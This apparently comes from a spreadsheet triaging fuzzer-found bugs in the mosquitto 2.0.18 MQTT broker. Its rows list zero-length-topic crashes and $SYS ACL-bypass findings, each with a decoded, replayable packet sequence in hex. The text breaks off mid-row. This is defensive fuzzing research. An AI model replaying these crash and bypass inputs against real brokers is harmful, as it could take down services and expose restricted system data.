        <f>== 种子标识: id:000008,sev:3,cat:0385 ===\u000a大小: 7207B (报告+请求数据)\u000a请求数据: 10247B\u000a\u000a---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MQTT请求序列(10247B原始二进制) ---\u000aMsg[1]: PUBACK PacketID=21588 | raw_header=4d5154540420020061666c6e658249fd\u000aMsg[2]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3bc0003b3b3b3b3b3b\u000aMsg[5]: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raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[17]: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PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[22]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[23]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[24]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[25]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000a(尾部2587B): 3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b</f>
        <v/>
      </c>
      <c r="F6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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J69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698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699">
      <c r="A699" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B699" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C699" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(184B)\u000a4.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99" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0040 ===\u000a大小: 561B (报告+请求数据)\u000a请求数据: 184B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(184B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=0 Topics=[''(零长度!QoS=1)] | raw_header=8206000000000103\u000aMsg[2]: AUTH  | raw_header=f000\u000aMsg[3]: TYPE0  | raw_header=003c281100000e1021ffff270fffffff\u000aMsg[4]: (不完整,112B) raw=5f76355f04bb00001c2473686172652f67332f686f6d652f2b2f74656d7065726174757265163550\u000a(尾部112B): 5f76355f04bb00001c2473686172652f67332f686f6d652f2b2f74656d706572617475726516355000142473686172652f67</f>
        <v/>
      </c>
      <c r="F6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9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99" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J69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69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00">
      <c r="A700" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B700" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C700" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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00" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0042 ===\u000a大小: 722B (报告+请求数据)\u000a请求数据: 176B\u000a\u000a---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MQTT请求序列(176B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='client_01'(9B) clean_session=True keepalive=63s Will=YES WillTopic='will/topic' [自动清理会话] | raw_header=104100044d51545404c6003f0009636c\u000aMsg[2]: PUBREC PacketID=50688 | raw_header=5404c6003f00\u000aMsg[3]: TYPE0  | raw_header=09636c69656e745f3031000a77696c6c\u000aMsg[4]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F7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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J70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1">
      <c r="A701" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B701" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C701" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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01" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c0 ===\u000a大小: 705B (报告+请求数据)\u000a请求数据: 141B\u000a\u000a---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MQTT请求序列(141B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1425 Topics=['+/data'(QoS=0), ''(零长度!QoS=1), 'a/b/c/d/e'(QoS=2)] | raw_header=821a059100062b2f6461746100000001\u000aMsg[2]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=1 retain=True payload_len=62B | raw_header=3b6b002b766572792f646565702f746f\u000aMsg[3]: CONNACK  | raw_header=2500\u000aMsg[4]: (不完整,2B) raw=69e2\u000a(尾部2B): 69e2</f>
        <v/>
      </c>
      <c r="F7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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J7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01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02">
      <c r="A702" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B702" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C702" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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702" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c2 ===\u000a大小: 1183B (报告+请求数据)\u000a请求数据: 184B\u000a\u000a---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MQTT请求序列(184B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=52 Topics=[''(零长度!QoS=1), '$share/g3/home/+/temperature'(QoS=0)] | raw_header=82240034000001001c2473686172652f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload='\x005±\x8bgå\x06\x1eõ1U²ç\x921¤\x92Ä\x89' | raw_header=3532001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,94B) raw=dc6e23f17f080001cd09000dd98c07784ffb93307fff53c42726002b766572792c646565802f652f\u000a(尾部94B): dc6e23f17f080001cd09000dd98c07784ffb93307fff53c42726002b766572792c646565802f652f7a7a65725f73796e6300</f>
        <v/>
      </c>
      <c r="F7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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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3">
      <c r="A703" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:4,cat:0141</t>
        </is>
      </c>
      <c r="B703" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C703" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(88B)\u000a4.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703" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0141 ===\u000a大小: 812B (报告+请求数据)\u000a请求数据: 88B\u000a\u000a---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MQTT请求序列(88B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=20 Topics=['home/+/temperature'(QoS=1), ''(零长度!QoS=1)] | raw_header=821a00140012686f6d652f2b2f74656d\u000aMsg[2]: PUBLISH Topic='$share/grp1/#' QoS=0 retain=False payload_len=41B | raw_header=3038000d2473686172652f677270312f\u000aMsg[3]: CONNECT  | raw_header=1000</f>
        <v/>
      </c>
      <c r="F7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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J70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03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04">
      <c r="A704" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:4,cat:0142</t>
        </is>
      </c>
      <c r="B704" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C704" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(285B)\u000a4.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704" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0142 ===\u000a大小: 983B (报告+请求数据)\u000a请求数据: 285B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(285B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=40s Will=YES [自动清理会话] | raw_header=105000044d51545404c6002800000141\u000aMsg[2]: PUBACK PacketID=28016 | raw_header=41416d702f72f021181f15000b534352\u000aMsg[3]: TYPE0  | raw_header=004141414141414149415f6d7366ffe8\u000aMsg[4]: (不完整,69B) raw=41494141414141414141414141414141414141412e41414141414141414141414141414141414141\u000a(尾部69B): 41494141414141414141414141414141414141412e4141414141414141414141414141414141414141414141414141414141</f>
        <v/>
      </c>
      <c r="F7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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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5">
      <c r="A705" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:4,cat:0143</t>
        </is>
      </c>
      <c r="B705" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C705" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(300B)\u000a4.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0x0143\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E705" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0143 ===\u000a大小: 1042B (报告+请求数据)\u000a请求数据: 300B\u000a\u000a---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MQTT请求序列(300B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQT\x00 v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=104100044d5154000000000000000000\u000aMsg[2]: TYPE0  | raw_header=044d515454e6c5003c00184141414141\u000aMsg[3]: TYPE0  | raw_header=0a77696c6c2f746f706963000877696c\u000aMsg[4]: (不完整,33B) raw=6d7367000966757a7a5f75736572000966757a7a5f70617373e00010230018ed5d\u000a(尾部33B): 6d7367000966757a7a5f75736572000966757a7a5f70617373e00010230018ed5d</f>
        <v/>
      </c>
      <c r="F7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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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6">
      <c r="A706" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:4,cat:01c2</t>
        </is>
      </c>
      <c r="B706" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C706" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(282B)\u000a4.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706" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:01c2 ===\u000a大小: 1167B (报告+请求数据)\u000a请求数据: 282B\u000a\u000a---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MQTT请求序列(282B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v255 ClientID='\x00\x0e\x10!ÿÿ'\x0fÿÿÿ"\x00\u000a\x19\x00\x17\x01&amp;MQTT\x05Â\x00\x00\x00\x00 \x00\x0e'(32B) clean_session=True keepalive=0s Will=YES [自动清理会话] | raw_header=105c00044d515454ff7f000000002000\u000aMsg[2]: CONNACK  | raw_header=2a00\u000aMsg[3]: PUBREL  | raw_header=6100\u000aMsg[4]: TYPE0  | raw_header=0123000013245359532f62726f6b6572\u000aMsg[5]: PUBCOMP  | raw_header=7000\u000aMsg[6]: PUBLISH Topic='sensor/temp' QoS=2 retain=True payload_len=41B | raw_header=3536000b73656e736f722f74656d7000\u000aMsg[7]: (不完整,89B) raw=757a7a000c5975400c667540005f76355f75736554ff7a7a7a7a1900170126000d6d6266757a7a65\u000a(尾部89B): 757a7a000c5975400c667540005f76355f75736554ff7a7a7a7a1900170126000d6d6266757a7a65725f7c796e6300027635</f>
        <v/>
      </c>
      <c r="F7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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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7">
      <c r="A707" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B707" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C707" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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07" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0244 ===\u000a大小: 760B (报告+请求数据)\u000a请求数据: 122B\u000a\u000a---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PacketID=91 Topics=[''(零长度!QoS=2)] | raw_header=8210005b00000a746573742f746f7069\u000aMsg[2]: PUBLISH Topic='t' QoS=0 retain=False payload_len=98B | raw_header=38650001742209000a12acb5bd1a5cae\u000aMsg[3]: PUBLISH  | raw_header=3d</f>
        <v/>
      </c>
      <c r="F7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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J7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0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08">
      <c r="A708" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:4,cat:0246</t>
        </is>
      </c>
      <c r="B708" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C708" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(3177B)\u000a4.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Sev4\u000a- 违规类别代码: 0x0246\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E708" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0246 ===\u000a大小: 4869B (报告+请求数据)\u000a请求数据: 3177B\u000a\u000a---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MQTT请求序列(3177B原始二进制) ---\u000aMsg[1]: CONNECT  | raw_header=100100\u000aMsg[2]: TYPE0  | raw_header=044d51546e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[3]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[4]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[5]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[6]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[7]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[8]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[9]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[10]: PINGREQ  | raw_header=c000\u000aMsg[11]: PUBLISH Topic='test/b' QoS=2 retain=False payload='\x00\u000awor\x00e' | raw_header=340f0006746573742f62000a776f7200\u000aMsg[12]: PUBREL PacketID=12140 | raw_header=6c312f6c0e116e6e6e6e6e6e6e6e6e6e\u000aMsg[13]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[14]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[15]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[16]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[17]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[18]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[19]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[20]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e5e6e6e6e6e6e6e\u000aMsg[21]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[22]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[23]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e616e6e896e6e6e6e6e6e\u000aMsg[24]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[25]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000a(尾部785B): 6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e4d6e6e6e6e6e6e6e6e</f>
        <v/>
      </c>
      <c r="F7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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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0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09">
      <c r="A709" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B709" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C709" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(5028B)\u000a4.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Sev4\u000a- 违规类别代码: 0x02c4\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E709" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c4 ===\u000a大小: 6142B (报告+请求数据)\u000a请求数据: 5028B\u000a\u000a---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MQTT请求序列(5028B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v5 ClientID=''(4352B) clean_session=True keepalive=60s [自动清理会话] | raw_header=105c00044d51545405c2003c28110000\u000aMsg[2]: SUBSCRIBE PacketID=589 Topics=[''(零长度!QoS=3)] | raw_header=823d024d000013245359532f62736f6b\u000aMsg[3]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3409006565656565656565\u000aMsg[4]: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raw_header=65656565656565656565652565656565\u000aMsg[8]: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raw_header=65656565656565656565656565656565\u000aMsg[12]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[13]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[14]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[15]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[16]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[17]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[18]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[19]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[20]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[21]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[22]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[23]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[24]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[25]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000a(尾部1705B): 6565656565656565656565656565656565656565656565656565656565656565656565656565656565656565656565656565</f>
        <v/>
      </c>
      <c r="F7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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J7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0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10">
      <c r="A710" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B710" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C710" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(1269B)\u000a4.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710" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c6 ===\u000a大小: 2543B (报告+请求数据)\u000a请求数据: 1269B\u000a\u000a---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MQTT请求序列(1269B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=105f7061ff7382353535353535353535\u000aMsg[2]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3535ffff22000a1900170126000d6d62\u000aMsg[3]: PUBCOMP PacketID=29184 | raw_header=736572000c66757a7a5f76355f706173\u000aMsg[4]: PUBCOMP PacketID=25856 | raw_header=75726500152473686172652f6772702f\u000aMsg[5]: TYPE0  | raw_header=05353535353535353535353535353535\u000aMsg[6]: PUBCOMP PacketID=46614 | raw_header=757ab616d7355f7061737382825f7061\u000aMsg[7]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353548353535353535353535\u000aMsg[8]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b353535353535353535353535353535\u000aMsg[9]: PUBREC PacketID=13621 | raw_header=55353535353535353535353535353535\u000aMsg[10]: (不完整,554B) raw=35ff3535353535353535353535353535353535353535353535353535353535353535353535353535\u000a(尾部554B): 35ff353535353535353535353535353535353535353535353535353535353535353535353535353535353535353535353535</f>
        <v/>
      </c>
      <c r="F7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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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11">
      <c r="A711" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B711" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C711" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(355B)\u000a4.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711" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0002 ===\u000a大小: 814B (报告+请求数据)\u000a请求数据: 355B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(355B原始二进制) ---\u000aMsg[1]: AUTH  | raw_header=ff2020202009202020ee203c28110000\u000aMsg[2]: TYPE0  | raw_header=000d6d6266757a7a65725f73796e63\u000aMsg[3]: TYPE0  | raw_header=00027635\u000aMsg[4]: TYPE0  | raw_header=000b61666c6e65745f66757a7a\u000aMsg[5]: TYPE0  | raw_header=000c66757a7a5f76355f75736572\u000aMsg[6]: TYPE0  | raw_header=000c66757a7a5f76355f70617373\u000aMsg[7]: UNSUBSCRIBE  | raw_header=a240000c00001c2473686172652f6733\u000aMsg[8]: SUBSCRIBE PacketID=258 Topics=[] | raw_header=82310102110bd1ffd50b260001230006\u000aMsg[9]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=False payload_len=96B | raw_header=387f001d245359532f62726f6b65722f\u000aMsg[10]: TYPE0  | raw_header=00012f\u000aMsg[11]: (不完整,12B) raw=0157090000001568656c6c6f\u000a(尾部12B): 0157090000001568656c6c6f</f>
        <v/>
      </c>
      <c r="F7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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J71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12">
      <c r="A712" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:3,cat:000a</t>
        </is>
      </c>
      <c r="B712" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C712" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(670B)\u000a4.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712" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:000a ===\u000a大小: 4033B (报告+请求数据)\u000a请求数据: 670B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(670B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[3]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[4]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[5]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f192f2f2f2f2f2f2f2f2f\u000aMsg[6]: CONNACK session_present=80 reason_code=47 | raw_header=2f2f502f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[7]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f1c2f2f2f2f\u000aMsg[8]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f012f2f2f012f\u000aMsg[9]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[10]: PUBREC PacketID=12544 | raw_header=5f3031000a77696c6c2f746f70696300\u000aMsg[11]: SUBSCRIBE PacketID=16 Topics=['$SYS/#'(QoS=0)] | raw_header=820b00100006245359532f2300\u000aMsg[12]: SUBSCRIBE PacketID=17 